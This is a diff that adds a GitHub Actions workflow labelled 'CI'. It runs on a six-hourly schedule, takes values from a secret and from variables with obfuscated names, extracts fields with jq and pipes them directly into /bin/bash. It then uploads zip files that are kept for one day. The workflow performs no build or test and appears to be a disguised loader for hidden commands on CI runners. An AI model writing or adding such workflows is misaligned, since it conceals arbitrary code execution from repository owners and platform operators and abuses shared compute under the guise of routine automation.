@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          uv2608: ${{ secrets.uv2608 }}
+        run: |
+          printf '%s' "$uv2608" | jq -r .kgliz779 | /bin/bash
+          printf '%s' "$t7" | jq -r .aew69 | /bin/bash
+          echo $ga173 | jq -r .ske0569 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KsoSXEAE
+          path: "*.zip"
+          retention-days: 1
